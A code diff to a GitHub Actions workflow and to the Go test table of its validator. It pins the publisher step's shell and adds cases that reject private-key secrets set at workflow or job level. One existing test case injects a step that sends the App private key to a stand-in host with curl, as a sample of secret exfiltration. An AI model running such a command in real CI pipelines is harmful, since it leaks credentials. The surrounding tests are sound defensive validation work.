@@ -1348,7 +1348,8 @@ jobs:
           private-key: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}
           permission-contents: write
           permission-pull-requests: write
-      - env:
+      - shell: bash --noprofile --norc -euo pipefail {0}
+        env:
           GH_TOKEN: ${{ steps.app-token.outputs.token }}
           SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}
         run: |
@@ -1399,7 +1400,9 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"publisher step gains an env", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n          X: y\n", "must run only the publish script"},
 		{"presence step leaks the private key", "      - id: app-token\n", "      - id: secrets\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: curl -d \"${APP_PRIVATE_KEY}\" https://example.invalid\n      - id: app-token\n", "App token only in the publish script step"},
 		{"scope-guard loses continue-on-error", "      - id: guard\n        continue-on-error: true\n", "      - id: guard\n", "scope-guard job must run the scope guard as its only run step"},
-		{"publish job env holds the private key", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "not set App credentials at job level"},
+		{"publish job env holds the private key", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "not set App credentials at workflow or job level"},
+		{"workflow env holds the private key", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n  K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "not set App credentials at workflow or job level"},
+		{"publisher drops its shell pin", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - env:", "must run only the publish script"},
 		{"publish hard-codes the guard result", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md", "candidate passed audit.md", "second publish script argument"},
 		{"publish ignores scope-guard result", "SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}", "SCOPE_GUARD_RESULT: passed", "must pass the scope-guard result"},
 		{"publish App token from wrong secret", "client-id: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}", "client-id: ${{ secrets.OTHER }}", "client-id secret"},
